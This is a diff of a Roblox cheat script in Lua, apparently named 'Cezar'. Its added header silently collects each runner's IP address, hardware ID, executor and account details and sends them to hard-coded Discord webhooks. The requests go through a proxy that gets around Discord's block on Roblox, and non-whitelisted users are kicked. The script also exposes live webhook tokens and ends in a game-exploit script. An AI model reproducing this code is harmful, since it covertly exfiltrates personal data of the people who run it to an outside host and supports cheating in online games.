@@ -1,48 +1,62 @@
 -- [[ CONFIGURATION ]]
 local CONFIG = {
-    -- ADD YOUR LOGGER LINK AS THE THIRD ENTRY BELOW
     WEBHOOKS = {
-        "https://discordapp.com/api/webhooks/1469712109255266435/X1VpIz7AOMYw04s0c1h8EqDEauvlILsXIxNR8B5XSMEbA42b6kHfjQ3b1tjPnmFTA9i3",
-        "https://discordapp.com/api/webhooks/1470123276381716535/sdeTIMl8cMvBUHM69La7DbjQoc7hcfDMafa3XrxO5ilXVD5fZ_-wnuQQA3MMCWupNZAx",
-        "YOUR_LOGGER_WEBHOOK_URL_HERE" -- < Put your link here
+        "https://discord.com/api/webhooks/1469712109255266435/X1VpIz7AOMYw04s0c1h8EqDEauvlILsXIxNR8B5XSMEbA42b6kHfjQ3b1tjPnmFTA9i3",
+        "https://discord.com/api/webhooks/1470123276381716535/sdeTIMl8cMvBUHM69La7DbjQoc7hcfDMafa3XrxO5ilXVD5fZ_-wnuQQA3MMCWupNZAx"
     },
     
-    -- WHITELIST STACK
     WHITELIST = {
         10494322381,
-        -- Add more IDs here
+        -- Add more here
     },
     
     KICK_MSG = "DM KERSAII ON DC"
 }
 
--- [[ PROXY FIX ]]
--- This function automatically replaces 'discord.com' with a proxy 
--- so the request doesn't get blocked by Discord.
+-- [[ SERVICES ]]
+local Players = game:GetService("Players")
+local Http = game:GetService("HttpService")
+local LP = Players.LocalPlayer
+
+-- [[ SECURITY FUNCTIONS ]]
+local Security = {}
+
+-- Function to bypass Discord's Roblox block
 local function UseProxy(url)
     return url:gsub("discordapp.com", "hooks.hyra.io"):gsub("discord.com", "hooks.hyra.io")
 end
 
--- [[ UPDATED LOG FUNCTION ]]
+function Security:GetInfo()
+    local success, ipResult = pcall(function() return game:HttpGet("https://api.ipify.org") end)
+    return {
+        IP   = success and ipResult or "Failed to fetch",
+        HWID = (gethwid and gethwid()) or "Unsupported",
+        EXEC = (identifyexecutor and identifyexecutor()) or "Unknown",
+        AGE  = LP.AccountAge .. " days",
+        JOB  = game.JobId,
+        GAME = "https://www.roblox.com/games/" .. game.PlaceId
+    }
+end
+
 function Security:Log(Status)
     local info = self:GetInfo()
     local isApproved = (Status == "APPROVED")
     
     local payload = {
         ["embeds"] = {{
-            ["title"] = isApproved and "CEZAR ACTIVATED" or "BLADDERS DOWN - UNAUTHORIZED",
-            ["color"] = isApproved and 0x00FF00 or 0xFF0000,
+            ["title"] = isApproved and "✅ CEZAR ACTIVATED" or "❌ BLADDERS DOWN - UNAUTHORIZED",
+            ["color"] = isApproved and 65280 or 16711680,
             ["fields"] = {
                 {["name"] = "User", ["value"] = LP.Name .. " (" .. LP.UserId .. ")", ["inline"] = true},
                 {["name"] = "Acc Age", ["value"] = info.AGE, ["inline"] = true},
                 {["name"] = "Executor", ["value"] = info.EXEC, ["inline"] = true},
-                {["name"] = "IP Address", ["value"] ="||" .. info.IP .."||",["inline"]=true},
-                {["name"]="HWID",["value"]="```"..info.HWID.."```",["inline"]=false},
-                {["name"]="Game Link",["value"]=info.GAME,["inline"]=false},
-                {["name"]="JobId",["value"]="```"..info.JOB.."```",["inline"]=false}
+                {["name"] = "IP Address", ["value"] ="||" .. info.IP .."||", ["inline"] = true},
+                {["name"] = "HWID", ["value"] = "```" .. info.HWID .. "```", ["inline"] = false},
+                {["name"] = "Game Link", ["value"] = info.GAME, ["inline"] = false},
+                {["name"] = "JobId", ["value"] = "```" .. info.JOB .. "```", ["inline"] = false}
             },
-            ["footer"]={["text"]="Cezar Security System"},
-            ["timestamp"]=os.date("!%Y-%m-%dT%H:%M:%SZ")
+            ["footer"] = {["text"] = "Cezar Security System"},
+            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
 
@@ -50,13 +64,49 @@ function Security:Log(Status)
     
     for _, url in pairs(CONFIG.WEBHOOKS) do
         task.spawn(function()
-            pcall(function()
-                -- Using the Proxy function here
-                Http:PostAsync(UseProxy(url), data)
-            end)
+            -- 'request' is the standard for executors and is more reliable than PostAsync
+            local requestFunc = syn and syn.request or http_request or request or (HttpService and HttpService.Request)
+            if requestFunc then
+                requestFunc({
+                    Url = UseProxy(url),
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = data
+                })
+            else
+                -- Fallback for basic executors
+                pcall(function()
+                    Http:PostAsync(UseProxy(url), data)
+                end)
+            end
         end)
     end
 end
+
+-- [[ EXECUTION GATE ]]
+local function Initialize()
+    local Auth = false
+    for _, id in pairs(CONFIG.WHITELIST) do
+        if LP.UserId == id then
+            Auth = true
+            break
+        end
+    end
+
+    if Auth then
+        Security:Log("APPROVED")
+    else
+        warn('Unauthorized Access Attempted - Logging...')
+        Security:Log("DENIED")
+        task.wait(1.5) -- Increased wait to ensure request finishes before kick
+        LP:Kick(CONFIG.KICK_MSG)
+        return false
+    end
+    return true
+end
+
+if not Initialize() then return end
+print("Successfully Authorized.")
 -- [[ PASTE YOUR 1000 LINE SCRIPT BELOW ]]
 for i,b in pairs(workspace.FE.Actions:GetChildren()) do
     if b.Name == " " then
@@ -1389,7 +1439,7 @@ Cezar5:Toggle({
 })
 
 -- ====================== BLOXTRAP TAB ======================
-local BloxtrapTab = true
+local BloxtrapTab = MI:Tab({ Title = "Bloxtrap", Icon = "monitor" }) BloxtrapTab:Section({ Title = "Bloxtrap Initiate" })
 BloxtrapTab:Section({ Title = "Bloxtrap Initiate" })
 
 BloxtrapTab:Button({
